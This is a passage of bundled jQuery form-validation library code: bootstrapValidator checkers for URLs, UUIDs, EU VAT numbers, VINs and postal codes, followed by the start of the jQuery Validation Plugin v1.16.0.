        validate: function(b, c, d) {
            var e = c.val();
            if ("" == e)
                return !0;
            var f = a.trim(e).length;
            return d.min && f < d.min || d.max && f > d.max ? !1 : !0
        }
    }
}(window.jQuery),
function(a) {
    a.fn.bootstrapValidator.validators.uri = {
        html5Attributes: {
            message: "message",
            allowlocal: "allowLocal"
        },
        enableByHtml5: function(a) {
            return "url" == a.attr("type")
        },
        validate: function(a, b, c) {
            var d = b.val();
            if ("" == d)
                return !0;
            var e = 1 == c.allowLocal || "true" == c.allowLocal
              , f = new RegExp("^(?:(?:https?|ftp)://)(?:\\S+(?::\\S*)?@)?(?:" + (e ? "" : "(?!(?:10|127)(?:\\.\\d{1,3}){3})(?!(?:169\\.254|192\\.168)(?:\\.\\d{1,3}){2})(?!172\\.(?:1[6-9]|2\\d|3[0-1])(?:\\.\\d{1,3}){2})") + "(?:[1-9]\\d?|1\\d\\d|2[01]\\d|22[0-3])(?:\\.(?:1?\\d{1,2}|2[0-4]\\d|25[0-5])){2}(?:\\.(?:[1-9]\\d?|1\\d\\d|2[0-4]\\d|25[0-4]))|(?:(?:[a-z\\u00a1-\\uffff0-9]+-?)*[a-z\\u00a1-\\uffff0-9]+)(?:\\.(?:[a-z\\u00a1-\\uffff0-9]+-?)*[a-z\\u00a1-\\uffff0-9]+)*(?:\\.(?:[a-z\\u00a1-\\uffff]{2,})))(?::\\d{2,5})?(?:/[^\\s]*)?$","i");
            return f.test(d)
        }
    }
}(window.jQuery),
function(a) {
    a.fn.bootstrapValidator.validators.uuid = {
        html5Attributes: {
            message: "message",
            version: "version"
        },
        validate: function(a, b, c) {
            var d = b.val();
            if ("" == d)
                return !0;
            var e = {
                3: /^[0-9A-F]{8}-[0-9A-F]{4}-3[0-9A-F]{3}-[0-9A-F]{4}-[0-9A-F]{12}$/i,
                4: /^[0-9A-F]{8}-[0-9A-F]{4}-4[0-9A-F]{3}-[89AB][0-9A-F]{3}-[0-9A-F]{12}$/i,
                5: /^[0-9A-F]{8}-[0-9A-F]{4}-5[0-9A-F]{3}-[89AB][0-9A-F]{3}-[0-9A-F]{12}$/i,
                all: /^[0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12}$/i
            }
              , f = c.version ? c.version + "" : "all";
            return null == e[f] ? !0 : e[f].test(d)
        }
    }
}(window.jQuery),
function(a) {
    a.fn.bootstrapValidator.validators.vat = {
        html5Attributes: {
            message: "message",
            country: "country"
        },
        validate: function(a, b, c) {
            var d = b.val();
            if ("" == d)
                return !0;
            var e = c.country || d.substr(0, 2)
              , f = ["_", e.toLowerCase()].join("");
            return this[f] && "function" == typeof this[f] ? this[f](d) : !0
        },
        _at: function(a) {
            if (!/^ATU[0-9]{8}$/.test(a))
                return !1;
            a = a.substr(3);
            for (var b = 0, c = [1, 2, 1, 2, 1, 2, 1], d = 0, e = 0; 7 > e; e++)
                d = parseInt(a.charAt(e)) * c[e],
                d > 9 && (d = Math.floor(d / 10) + d % 10),
                b += d;
            return b = 10 - (b + 4) % 10,
            10 == b && (b = 0),
            b == a.substr(7, 1)
        },
        _be: function(a) {
            if (!/^BE[0]{0,1}[0-9]{9}$/.test(a))
                return !1;
            if (a = a.substr(2),
            9 == a.length && (a = "0" + a),
            0 == a.substr(1, 1))
                return !1;
            var b = parseInt(a.substr(0, 8), 10) + parseInt(a.substr(8, 2), 10);
            return b % 97 == 0
        },
        _bg: function(b) {
            if (!/^BG[0-9]{9,10}$/.test(b))
                return !1;
            b = b.substr(2);
            var c = 0
              , d = 0;
            if (9 == b.length) {
                for (d = 0; 8 > d; d++)
                    c += parseInt(b.charAt(d)) * (d + 1);
                if (c %= 11,
                10 == c)
                    for (c = 0,
                    d = 0; 8 > d; d++)
                        c += parseInt(b.charAt(d)) * (d + 3);
                return c %= 10,
                c == b.substr(8)
            }
            if (10 == b.length) {
                var e = function(b) {
                    var c = parseInt(b.substr(0, 2), 10) + 1900
                      , d = parseInt(b.substr(2, 2), 10)
                      , e = parseInt(b.substr(4, 2), 10);
                    if (d > 40 ? (c += 100,
                    d -= 40) : d > 20 && (c -= 100,
                    d -= 20),
                    !a.fn.bootstrapValidator.helpers.date(c, d, e))
                        return !1;
                    for (var f = 0, g = [2, 4, 8, 5, 10, 9, 7, 3, 6], h = 0; 9 > h; h++)
                        f += parseInt(b.charAt(h)) * g[h];
                    return f = f % 11 % 10,
                    f == b.substr(9, 1)
                }
                  , f = function(a) {
                    for (var b = 0, c = [21, 19, 17, 13, 11, 9, 7, 3, 1], d = 0; 9 > d; d++)
                        b += parseInt(a.charAt(d)) * c[d];
                    return b %= 10,
                    b == a.substr(9, 1)
                }
                  , g = function(a) {
                    for (var b = 0, c = [4, 3, 2, 7, 6, 5, 4, 3, 2], d = 0; 9 > d; d++)
                        b += parseInt(a.charAt(d)) * c[d];
                    return b = 11 - b % 11,
                    10 == b ? !1 : (11 == b && (b = 0),
                    b == a.substr(9, 1))
                };
                return e(b) || f(b) || g(b)
            }
            return !1
        },
        _ch: function(a) {
            if (!/^CHE[0-9]{9}(MWST)?$/.test(a))
                return !1;
            a = a.substr(3);
            for (var b = 0, c = [5, 4, 3, 2, 7, 6, 5, 4], d = 0; 8 > d; d++)
                b += parseInt(a.charAt(d), 10) * c[d];
            return b = 11 - b % 11,
            10 == b ? !1 : (11 == b && (b = 0),
            b == a.substr(8, 1))
        },
        _cy: function(a) {
            if (!/^CY[0-5|9]{1}[0-9]{7}[A-Z]{1}$/.test(a))
                return !1;
            if (a = a.substr(2),
            "12" == a.substr(0, 2))
                return !1;
            for (var b = 0, c = {
                0: 1,
                1: 0,
                2: 5,
                3: 7,
                4: 9,
                5: 13,
                6: 15,
                7: 17,
                8: 19,
                9: 21
            }, d = 0; 8 > d; d++) {
                var e = parseInt(a.charAt(d), 10);
                d % 2 == 0 && (e = c[e + ""]),
                b += e
            }
            return b = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"[b % 26],
            b == a.substr(8, 1)
        },
        _cz: function(b) {
            if (!/^CZ[0-9]{8,10}$/.test(b))
                return !1;
            b = b.substr(2);
            var c = 0
              , d = 0;
            if (8 == b.length) {
                if (b.charAt(0) + "" == "9")
                    return !1;
                for (c = 0,
                d = 0; 7 > d; d++)
                    c += parseInt(b.charAt(d), 10) * (8 - d);
                return c = 11 - c % 11,
                10 == c && (c = 0),
                11 == c && (c = 1),
                c == b.substr(7, 1)
            }
            if (9 == b.length && b.charAt(0) + "" == "6") {
                for (c = 0,
                d = 0; 7 > d; d++)
                    c += parseInt(b.charAt(d + 1), 10) * (8 - d);
                return c = 11 - c % 11,
                10 == c && (c = 0),
                11 == c && (c = 1),
                c = [8, 7, 6, 5, 4, 3, 2, 1, 0, 9, 10][c - 1],
                c == b.substr(8, 1)
            }
            if (9 == b.length || 10 == b.length) {
                var e = 1900 + parseInt(b.substr(0, 2))
                  , f = parseInt(b.substr(2, 2)) % 50 % 20
                  , g = parseInt(b.substr(4, 2));
                if (9 == b.length) {
                    if (e >= 1980 && (e -= 100),
                    e > 1953)
                        return !1
                } else
                    1954 > e && (e += 100);
                if (!a.fn.bootstrapValidator.helpers.date(e, f, g))
                    return !1;
                if (10 == b.length) {
                    var h = parseInt(b.substr(0, 9), 10) % 11;
                    return 1985 > e && (h %= 10),
                    h == b.substr(9, 1)
                }
                return !0
            }
            return !1
        },
        _de: function(b) {
            return /^DE[0-9]{9}$/.test(b) ? (b = b.substr(2),
            a.fn.bootstrapValidator.helpers.mod_11_10(b)) : !1
        },
        _dk: function(a) {
            if (!/^DK[0-9]{8}$/.test(a))
                return !1;
            a = a.substr(2);
            for (var b = 0, c = [2, 7, 6, 5, 4, 3, 2, 1], d = 0; 8 > d; d++)
                b += parseInt(a.charAt(d), 10) * c[d];
            return b % 11 == 0
        },
        _ee: function(a) {
            if (!/^EE[0-9]{9}$/.test(a))
                return !1;
            a = a.substr(2);
            for (var b = 0, c = [3, 7, 1, 3, 7, 1, 3, 7, 1], d = 0; 9 > d; d++)
                b += parseInt(a.charAt(d)) * c[d];
            return b % 10 == 0
        },
        _es: function(a) {
            if (!/^ES[0-9A-Z][0-9]{7}[0-9A-Z]$/.test(a))
                return !1;
            a = a.substr(2);
            var b = function(a) {
                var b = parseInt(a.substr(0, 8), 10);
                return b = "TRWAGMYFPDXBNJZSQVHLCKE"[b % 23],
                b == a.substr(8, 1)
            }
              , c = function(a) {
                var b = ["XYZ".indexOf(a.charAt(0)), a.substr(1)].join("");
                return b = parseInt(b, 10),
                b = "TRWAGMYFPDXBNJZSQVHLCKE"[b % 23],
                b == a.substr(8, 1)
            }
              , d = function(a) {
                var b, c = a.charAt(0);
                if (-1 != "KLM".indexOf(c))
                    return b = parseInt(a.substr(1, 8), 10),
                    b = "TRWAGMYFPDXBNJZSQVHLCKE"[b % 23],
                    b == a.substr(8, 1);
                if (-1 != "ABCDEFGHJNPQRSUVW".indexOf(c)) {
                    for (var d = 0, e = [2, 1, 2, 1, 2, 1, 2], f = 0, g = 0; 7 > g; g++)
                        f = parseInt(a.charAt(g + 1)) * e[g],
                        f > 9 && (f = Math.floor(f / 10) + f % 10),
                        d += f;
                    return d = 10 - d % 10,
                    d == a.substr(8, 1) || "JABCDEFGHI"[d] == a.substr(8, 1)
                }
                return !1
            }
              , e = a.charAt(0);
            return /^[0-9]$/.test(e) ? b(a) : /^[XYZ]$/.test(e) ? c(a) : d(a)
        },
        _fi: function(a) {
            if (!/^FI[0-9]{8}$/.test(a))
                return !1;
            a = a.substr(2);
            for (var b = 0, c = [7, 9, 10, 5, 8, 4, 2, 1], d = 0; 8 > d; d++)
                b += parseInt(a.charAt(d)) * c[d];
            return b % 11 == 0
        },
        _fr: function(b) {
            if (!/^FR[0-9A-Z]{2}[0-9]{9}$/.test(b))
                return !1;
            if (b = b.substr(2),
            !a.fn.bootstrapValidator.helpers.luhn(b.substr(2)))
                return !1;
            if (/^[0-9]{2}$/.test(b.substr(0, 2)))
                return b.substr(0, 2) == parseInt(b.substr(2) + "12", 10) % 97;
            var c, d = "0123456789ABCDEFGHJKLMNPQRSTUVWXYZ";
            return c = /^[0-9]{1}$/.test(b.charAt(0)) ? 24 * d.indexOf(b.charAt(0)) + d.indexOf(b.charAt(1)) - 10 : 34 * d.indexOf(b.charAt(0)) + d.indexOf(b.charAt(1)) - 100,
            (parseInt(b.substr(2), 10) + 1 + Math.floor(c / 11)) % 11 == c % 11
        },
        _gb: function(a) {
            if (!(/^GB[0-9]{9}$/.test(a) || /^GB[0-9]{12}$/.test(a) || /^GBGD[0-9]{3}$/.test(a) || /^GBHA[0-9]{3}$/.test(a) || /^GB(GD|HA)8888[0-9]{5}$/.test(a)))
                return !1;
            a = a.substr(2);
            var b = a.length;
            if (5 == b) {
                var c = a.substr(0, 2)
                  , d = parseInt(a.substr(2));
                return "GD" == c && 500 > d || "HA" == c && d >= 500
            }
            if (11 == b && ("GD8888" == a.substr(0, 6) || "HA8888" == a.substr(0, 6)))
                return "GD" == a.substr(0, 2) && parseInt(a.substr(6, 3)) >= 500 || "HA" == a.substr(0, 2) && parseInt(a.substr(6, 3)) < 500 ? !1 : parseInt(a.substr(6, 3)) % 97 == parseInt(a.substr(9, 2));
            if (9 == b || 12 == b) {
                for (var e = 0, f = [8, 7, 6, 5, 4, 3, 2, 10, 1], g = 0; 9 > g; g++)
                    e += parseInt(a.charAt(g)) * f[g];
                return e %= 97,
                parseInt(a.substr(0, 3)) >= 100 ? 0 == e || 42 == e || 55 == e : 0 == e
            }
            return !0
        },
        _gr: function(a) {
            if (!/^GR[0-9]{9}$/.test(a))
                return !1;
            a = a.substr(2),
            8 == a.length && (a = "0" + a);
            for (var b = 0, c = [256, 128, 64, 32, 16, 8, 4, 2], d = 0; 8 > d; d++)
                b += parseInt(a.charAt(d)) * c[d];
            return b = b % 11 % 10,
            b == a.substr(8, 1)
        },
        _el: function(a) {
            return /^EL[0-9]{9}$/.test(a) ? (a = "GR" + a.substr(2),
            this._gr(a)) : !1
        },
        _hu: function(a) {
            if (!/^HU[0-9]{8}$/.test(a))
                return !1;
            a = a.substr(2);
            for (var b = 0, c = [9, 7, 3, 1, 9, 7, 3, 1], d = 0; 8 > d; d++)
                b += parseInt(a.charAt(d)) * c[d];
            return b % 10 == 0
        },
        _hr: function(b) {
            return /^HR[0-9]{11}$/.test(b) ? (b = b.substr(2),
            a.fn.bootstrapValidator.helpers.mod_11_10(b)) : !1
        },
        _ie: function(a) {
            if (!/^IE[0-9]{1}[0-9A-Z\*\+]{1}[0-9]{5}[A-Z]{1,2}$/.test(a))
                return !1;
            a = a.substr(2);
            var b = function(a) {
                for (; a.length < 7; )
                    a = "0" + a;
                for (var b = "WABCDEFGHIJKLMNOPQRSTUV", c = 0, d = 0; 7 > d; d++)
                    c += parseInt(a.charAt(d)) * (8 - d);
                return c += 9 * b.indexOf(a.substr(7)),
                b[c % 23]
            };
            return /^[0-9]+$/.test(a.substr(0, 7)) ? a.charAt(7) == b(a.substr(0, 7) + a.substr(8) + "") : -1 != "ABCDEFGHIJKLMNOPQRSTUVWXYZ+*".indexOf(a.charAt(1)) ? a.charAt(7) == b(a.substr(2, 5) + a.substr(0, 1) + "") : !0
        },
        _it: function(b) {
            if (!/^IT[0-9]{11}$/.test(b))
                return !1;
            if (b = b.substr(2),
            0 == parseInt(b.substr(0, 7)))
                return !1;
            var c = parseInt(b.substr(7, 3));
            return 1 > c || c > 201 && 999 != c && 888 != c ? !1 : a.fn.bootstrapValidator.helpers.luhn(b)
        },
        _lt: function(a) {
            if (!/^LT([0-9]{7}1[0-9]{1}|[0-9]{10}1[0-9]{1})$/.test(a))
                return !1;
            a = a.substr(2);
            for (var b = a.length, c = 0, d = 0; b - 1 > d; d++)
                c += parseInt(a.charAt(d)) * (1 + d % 9);
            var e = c % 11;
            if (10 == e) {
                c = 0;
                for (var d = 0; b - 1 > d; d++)
                    c += parseInt(a.charAt(d)) * (1 + (d + 2) % 9)
            }
            return e = e % 11 % 10,
            e == a.charAt(b - 1)
        },
        _lu: function(a) {
            return /^LU[0-9]{8}$/.test(a) ? (a = a.substr(2),
            a.substr(0, 6) % 89 == a.substr(6, 2)) : !1
        },
        _lv: function(b) {
            if (!/^LV[0-9]{11}$/.test(b))
                return !1;
            b = b.substr(2);
            var c = parseInt(b.charAt(0))
              , d = 0
              , e = []
              , f = 0
              , g = b.length;
            if (c > 3) {
                for (d = 0,
                e = [9, 1, 4, 8, 3, 10, 2, 5, 7, 6, 1],
                f = 0; g > f; f++)
                    d += parseInt(b.charAt(f)) * e[f];
                return d %= 11,
                3 == d
            }
            var h = parseInt(b.substr(0, 2))
              , i = parseInt(b.substr(2, 2))
              , j = parseInt(b.substr(4, 2));
            if (j = j + 1800 + 100 * parseInt(b.charAt(6)),
            !a.fn.bootstrapValidator.helpers.date(j, i, h))
                return !1;
            for (d = 0,
            e = [10, 5, 8, 4, 2, 1, 6, 3, 7, 9],
            f = 0; g - 1 > f; f++)
                d += parseInt(b.charAt(f)) * e[f];
            return d = (d + 1) % 11 % 10,
            d == b.charAt(g - 1)
        },
        _mt: function(a) {
            if (!/^MT[0-9]{8}$/.test(a))
                return !1;
            a = a.substr(2);
            for (var b = 0, c = [3, 4, 6, 7, 8, 9, 10, 1], d = 0; 8 > d; d++)
                b += parseInt(a.charAt(d)) * c[d];
            return b % 37 == 0
        },
        _nl: function(a) {
            if (!/^NL[0-9]{9}B[0-9]{2}$/.test(a))
                return !1;
            a = a.substr(2);
            for (var b = 0, c = [9, 8, 7, 6, 5, 4, 3, 2], d = 0; 8 > d; d++)
                b += parseInt(a.charAt(d)) * c[d];
            return b %= 11,
            b > 9 && (b = 0),
            b == a.substr(8, 1)
        },
        _no: function(a) {
            if (!/^NO[0-9]{9}$/.test(a))
                return !1;
            a = a.substr(2);
            for (var b = 0, c = [3, 2, 7, 6, 5, 4, 3, 2], d = 0; 8 > d; d++)
                b += parseInt(a.charAt(d)) * c[d];
            return b = 11 - b % 11,
            11 == b && (b = 0),
            b == a.substr(8, 1)
        },
        _pl: function(a) {
            if (!/^PL[0-9]{10}$/.test(a))
                return !1;
            a = a.substr(2);
            for (var b = 0, c = [6, 5, 7, 2, 3, 4, 5, 6, 7, -1], d = 0; 10 > d; d++)
                b += parseInt(a.charAt(d)) * c[d];
            return b % 11 == 0
        },
        _pt: function(a) {
            if (!/^PT[0-9]{9}$/.test(a))
                return !1;
            a = a.substr(2);
            for (var b = 0, c = [9, 8, 7, 6, 5, 4, 3, 2], d = 0; 8 > d; d++)
                b += parseInt(a.charAt(d)) * c[d];
            return b = 11 - b % 11,
            b > 9 && (b = 0),
            b == a.substr(8, 1)
        },
        _ro: function(a) {
            if (!/^RO[1-9][0-9]{1,9}$/.test(a))
                return !1;
            a = a.substr(2);
            for (var b = a.length, c = [7, 5, 3, 2, 1, 7, 5, 3, 2].slice(10 - b), d = 0, e = 0; b - 1 > e; e++)
                d += parseInt(a.charAt(e)) * c[e];
            return d = 10 * d % 11 % 10,
            d == a.substr(b - 1, 1)
        },
        _ru: function(a) {
            if (!/^RU([0-9]{9}|[0-9]{12})$/.test(a))
                return !1;
            if (a = a.substr(2),
            10 == a.length) {
                for (var b = 0, c = [2, 4, 10, 3, 5, 9, 4, 6, 8, 0], d = 0; 10 > d; d++)
                    b += parseInt(a.charAt(d)) * c[d];
                return b %= 11,
                b > 9 && (b %= 10),
                b == a.substr(9, 1)
            }
            if (12 == a.length) {
                for (var e = 0, f = [7, 2, 4, 10, 3, 5, 9, 4, 6, 8, 0], g = 0, h = [3, 7, 2, 4, 10, 3, 5, 9, 4, 6, 8, 0], d = 0; 11 > d; d++)
                    e += parseInt(a.charAt(d)) * f[d],
                    g += parseInt(a.charAt(d)) * h[d];
                return e %= 11,
                e > 9 && (e %= 10),
                g %= 11,
                g > 9 && (g %= 10),
                e == a.substr(10, 1) && g == a.substr(11, 1)
            }
            return !1
        },
        _rs: function(a) {
            if (!/^RS[0-9]{9}$/.test(a))
                return !1;
            a = a.substr(2);
            for (var b = 10, c = 0, d = 0; 8 > d; d++)
                c = (parseInt(a.charAt(d)) + b) % 10,
                0 == c && (c = 10),
                b = 2 * c % 11;
            return (b + parseInt(a.substr(8, 1))) % 10 == 1
        },
        _se: function(b) {
            return /^SE[0-9]{10}01$/.test(b) ? (b = b.substr(2, 10),
            a.fn.bootstrapValidator.helpers.luhn(b)) : !1
        },
        _si: function(a) {
            if (!/^SI[0-9]{8}$/.test(a))
                return !1;
            a = a.substr(2);
            for (var b = 0, c = [8, 7, 6, 5, 4, 3, 2], d = 0; 7 > d; d++)
                b += parseInt(a.charAt(d)) * c[d];
            return b = 11 - b % 11,
            10 == b && (b = 0),
            b == a.substr(7, 1)
        },
        _sk: function(a) {
            return /^SK[1-9][0-9][(2-4)|(6-9)][0-9]{7}$/.test(a) ? (a = a.substr(2),
            a % 11 == 0) : !1
        }
    }
}(window.jQuery),
function(a) {
    a.fn.bootstrapValidator.validators.vin = {
        validate: function(a, b) {
            var c = b.val();
            if ("" == c)
                return !0;
            if (!/^[a-hj-npr-z0-9]{8}[0-9xX][a-hj-npr-z0-9]{8}$/i.test(c))
                return !1;
            c = c.toUpperCase();
            for (var d = {
                A: 1,
                B: 2,
                C: 3,
                D: 4,
                E: 5,
                F: 6,
                G: 7,
                H: 8,
                J: 1,
                K: 2,
                L: 3,
                M: 4,
                N: 5,
                P: 7,
                R: 9,
                S: 2,
                T: 3,
                U: 4,
                V: 5,
                W: 6,
                X: 7,
                Y: 8,
                Z: 9,
                1: 1,
                2: 2,
                3: 3,
                4: 4,
                5: 5,
                6: 6,
                7: 7,
                8: 8,
                9: 9,
                0: 0
            }, e = [8, 7, 6, 5, 4, 3, 2, 10, 0, 9, 8, 7, 6, 5, 4, 3, 2], f = 0, g = c.length, h = 0; g > h; h++)
                f += d[c.charAt(h) + ""] * e[h];
            var i = f % 11;
            return 10 == i && (i = "X"),
            i == c.charAt(8)
        }
    }
}(window.jQuery),
function(a) {
    a.fn.bootstrapValidator.validators.zipCode = {
        html5Attributes: {
            message: "message",
            country: "country"
        },
        validate: function(a, b, c) {
            var d = b.val();
            if ("" == d || !c.country)
                return !0;
            var e = (c.country || "US").toUpperCase();
            switch (e) {
            case "CA":
                return /^(?:A|B|C|E|G|J|K|L|M|N|P|R|S|T|V|X|Y){1}[0-9]{1}(?:A|B|C|E|G|J|K|L|M|N|P|R|S|T|V|X|Y){1}\s?[0-9]{1}(?:A|B|C|E|G|J|K|L|M|N|P|R|S|T|V|X|Y){1}[0-9]{1}$/i.test(d);
            case "DK":
                return /^(DK(-|\s)?)?\d{4}$/i.test(d);
            case "GB":
                return this._gb(d);
            case "IT":
                return /^(I-|IT-)?\d{5}$/i.test(d);
            case "NL":
                return /^[1-9][0-9]{3} ?(?!sa|sd|ss)[a-z]{2}$/i.test(d);
            case "SE":
                return /^(S-)?\d{3}\s?\d{2}$/i.test(d);
            case "US":
            default:
                return /^\d{4,5}([\-]\d{4})?$/.test(d)
            }
        },
        _gb: function(a) {
            for (var b = "[ABCDEFGHIJKLMNOPRSTUWYZ]", c = "[ABCDEFGHKLMNOPQRSTUVWXY]", d = "[ABCDEFGHJKPMNRSTUVWXY]", e = "[ABEHMNPRVWXY]", f = "[ABDEFGHJLNPQRSTUWXYZ]", g = [new RegExp("^(" + b + "{1}" + c + "?[0-9]{1,2})(\\s*)([0-9]{1}" + f + "{2})$","i"), new RegExp("^(" + b + "{1}[0-9]{1}" + d + "{1})(\\s*)([0-9]{1}" + f + "{2})$","i"), new RegExp("^(" + b + "{1}" + c + "{1}?[0-9]{1}" + e + "{1})(\\s*)([0-9]{1}" + f + "{2})$","i"), new RegExp("^(BF1)(\\s*)([0-6]{1}[ABDEFGHJLNPQRST]{1}[ABDEFGHJLNPQRSTUWZYZ]{1})$","i"), /^(GIR)(\s*)(0AA)$/i, /^(BFPO)(\s*)([0-9]{1,4})$/i, /^(BFPO)(\s*)(c\/o\s*[0-9]{1,3})$/i, /^([A-Z]{4})(\s*)(1ZZ)$/i, /^(AI-2640)$/i], h = 0; h < g.length; h++)
                if (g[h].test(a))
                    return !0;
            return !1
        }
    }
}(window.jQuery);
/*! jQuery Validation Plugin - v1.16.0 - 12/2/2016
* http://jqueryvalidation.org/
* Copyright (c) 2016 Jörn Zaefferer; Licensed MIT */
!function(a) {
    "function" == typeof define && define.amd ? define(["jquery"], a) : "object" == typeof module && module.exports ? module.exports = a(require("jquery")) : a(jQuery)
}(function(a) {
    a.extend(a.fn, {
        validate: function(b) {
            if (!this.length)
                return void (b && b.debug && window.console && console.warn("Nothing selected, can't validate, returning nothing."));
            var c = a.data(this[0], "validator");
            return c ? c : (this.attr("novalidate", "novalidate"),
            c = new a.validator(b,this[0]),
            a.data(this[0], "validator", c),
            c.settings.onsubmit && (this.on("click.validate", ":submit", function(b) {
                c.settings.submitHandler && (c.submitButton = b.target),
                a(this).hasClass("cancel") && (c.cancelSubmit = !0),
                void 0 !== a(this).attr("formnovalidate") && (c.cancelSubmit = !0)
            }),
            this.on("submit.validate", function(b) {
                function d() {
                    var d, e;
                    return !c.settings.submitHandler || (c.submitButton && (d = a("<input type='hidden'/>").attr("name", c.submitButton.name).val(a(c.submitButton).val()).appendTo(c.currentForm)),
                    e = c.settings.submitHandler.call(c, c.currentForm, b),
                    c.submitButton && d.remove(),
                    void 0 !== e && e)
                }
                return c.settings.debug && b.preventDefault(),
                c.cancelSubmit ? (c.cancelSubmit = !1,
                d()) : c.form() ? c.pendingRequest ? (c.formSubmitted = !0,
                !1) : d() : (c.focusInvalid(),
                !1)
            })),
            c)
        },
        valid: function() {
            var b, c, d;
            return a(this[0]).is("form") ? b = this.validate().form() : (d = [],
            b = !0,
            c = a(this[0].form).validate(),
            this.each(function() {
                b = c.element(this) && b,
                b || (d = d.concat(c.errorList))
            }),
            c.errorList = d),
            b
        },
        rules: function(b, c) {
            var d, e, f, g, h, i, j = this[0];
            if (null != j && null != j.form) {
                if (b)
                    switch (d = a.data(j.form, "validator").settings,
                    e = d.rules,
                    f = a.validator.staticRules(j),
                    b) {
                    case "add":
                        a.extend(f, a.validator.normalizeRule(c)),
                        delete f.messages,
                        e[j.name] = f,
                        c.messages && (d.messages[j.name] = a.extend(d.messages[j.name], c.messages));
                        break;
                    case "remove":
                        return c ? (i = {},
                        a.each(c.split(/\s/), function(b, c) {
                            i[c] = f[c],
                            delete f[c],
                            "required" === c && a(j).removeAttr("aria-required")
                        }),
                        i) : (delete e[j.name],
                        f)
                    }
                return g = a.validator.normalizeRules(a.extend({}, a.validator.classRules(j), a.validator.attributeRules(j), a.validator.dataRules(j), a.validator.staticRules(j)), j),
                g.required && (h = g.required,
                delete g.required,
                g = a.extend({
                    required: h
                }, g),
                a(j).attr("aria-required", "true")),
                g.remote && (h = g.remote,
                delete g.remote,
                g = a.extend(g, {
                    remote: h
                })),
                g
            }
        }
    }),
    a.extend(a.expr.pseudos || a.expr[":"], {
        blank: function(b) {
            return !a.trim("" + a(b).val())
        },
        filled: function(b) {
            var c = a(b).val();
            return null !== c && !!a.trim("" + c)
        },
        unchecked: function(b) {
            return !a(b).prop("checked")
        }
    }),
    a.validator = function(b, c) {
        this.settings = a.extend(!0, {}, a.validator.defaults, b),
        this.currentForm = c,
        this.init()
    }
    ,
    a.validator.format = function(b, c) {
        return 1 === arguments.length ? function() {
            var c = a.makeArray(arguments);
            return c.unshift(b),
            a.validator.format.apply(this, c)
        }
        : void 0 === c ? b : (arguments.length > 2 && c.constructor !== Array && (c = a.makeArray(arguments).slice(1)),
        c.constructor !== Array && (c = [c]),
        a.each(c, function(a, c) {
            b = b.replace(new RegExp("\\{" + a + "\\}","g"), function() {
                return c
            })
        }),
        b)
    }
    ,
    a.extend(a.validator, {
        defaults: {
            messages: {},
            groups: {},
            rules: {},
            errorClass: "error",
            pendingClass: "pending",
            validClass: "valid",
            errorElement: "label",
            focusCleanup: !1,
            focusInvalid: !0,
            errorContainer: a([]),
            errorLabelContainer: a([]),
            onsubmit: !0,
            ignore: ":hidden",
            ignoreTitle: !1,
            onfocusin: function(a) {
                this.lastActive = a,
                this.settings.focusCleanup && (this.settings.unhighlight && this.settings.unhighlight.call(this, a, this.settings.errorClass, this.settings.validClass),
                this.hideThese(this.errorsFor(a)))
            },
            onfocusout: function(a) {
                this.checkable(a) || !(a.name in this.submitted) && this.optional(a) || this.element(a)
            },
            onkeyup: function(b, c) {
                var d = [16, 17, 18, 20, 35, 36, 37, 38, 39, 40, 45, 144, 225];
                9 === c.which && "" === this.elementValue(b) || a.inArray(c.keyCode, d) !== -1 || (b.name in this.submitted || b.name in this.invalid) && this.element(b)
            },
            onclick: function(a) {
                a.name in this.submitted ? this.element(a) : a.parentNode.name in this.submitted && this.element(a.parentNode)
            },
            highlight: function(b, c, d) {
                "radio" === b.type ? this.findByName(b.name).addClass(c).removeClass(d) : a(b).addClass(c).removeClass(d)
            },
            unhighlight: function(b, c, d) {
                "radio" === b.type ? this.findByName(b.name).removeClass(c).addClass(d) : a(b).removeClass(c).addClass(d)
            }
        },
        setDefaults: function(b) {
            a.extend(a.validator.defaults, b)
        },
        messages: {
            required: "This field is required.",
            remote: "Please fix this field.",
            email: "Please enter a valid email address.",
            url: "Please enter a valid URL.",
            date: "Please enter a valid date.",
            dateISO: "Please enter a valid date (ISO).",
            number: "Please enter a valid number.",
            digits: "Please enter only digits.",
            equalTo: "Please enter the same value again.",
            maxlength: a.validator.format("Please enter no more than {0} characters."),
            minlength: a.validator.format("Please enter at least {0} characters."),
            rangelength: a.validator.format("Please enter a value between {0} and {1} characters long."),
            range: a.validator.format("Please enter a value between {0} and {1}."),
            max: a.validator.format("Please enter a value less than or equal to {0}."),
            min: a.validator.format("Please enter a value greater than or equal to {0}."),
            step: a.validator.format("Please enter a multiple of {0}.")
        },
        autoCreateRanges: !1,
        prototype: {
            init: function() {
                function b(b) {
                    !this.form && this.hasAttribute("contenteditable") && (this.form = a(this).closest("form")[0]);
                    var c = a.data(this.form, "validator")
                      , d = "on" + b.type.replace(/^validate/, "")
                      , e = c.settings;
                    e[d] && !a(this).is(e.ignore) && e[d].call(c, this, b)
                }
                this.labelContainer = a(this.settings.errorLabelContainer),
                this.errorContext = this.labelContainer.length && this.labelContainer || a(this.currentForm),
                this.containers = a(this.settings.errorContainer).add(this.settings.errorLabelContainer),
                this.submitted = {},
                this.valueCache = {},
                this.pendingRequest = 0,
                this.pending = {},
                this.invalid = {},
                this.reset();
                var c, d = this.groups = {};
                a.each(this.settings.groups, function(b, c) {
                    "string" == typeof c && (c = c.split(/\s/)),
                    a.each(c, function(a, c) {
                        d[c] = b
                    })
                }),
                c = this.settings.rules,
                a.each(c, function(b, d) {
                    c[b] = a.validator.normalizeRule(d)
                }),
                a(this.currentForm).on("focusin.validate focusout.validate keyup.validate", ":text, [type='password'], [type='file'], select, textarea, [type='number'], [type='search'], [type='tel'], [type='url'], [type='email'], [type='datetime'], [type='date'], [type='month'], [type='week'], [type='time'], [type='datetime-local'], [type='range'], [type='color'], [type='radio'], [type='checkbox'], [contenteditable], [type='button']", b).on("click.validate", "select, option, [type='radio'], [type='checkbox']", b),
                this.settings.invalidHandler && a(this.currentForm).on("invalid-form.validate", this.settings.invalidHandler),
                a(this.currentForm).find("[required], [data-rule-required], .required").attr("aria-required", "true")
            },
            form: function() {
                return this.checkForm(),
                a.extend(this.submitted, this.errorMap),
                this.invalid = a.extend({}, this.errorMap),
                this.valid() || a(this.currentForm).triggerHandler("invalid-form", [this]),
                this.showErrors(),
                this.valid()
            },
            checkForm: function() {
                this.prepareForm();
                for (var a = 0, b = this.currentElements = this.elements(); b[a]; a++)
                    this.check(b[a]);
                return this.valid()
            },
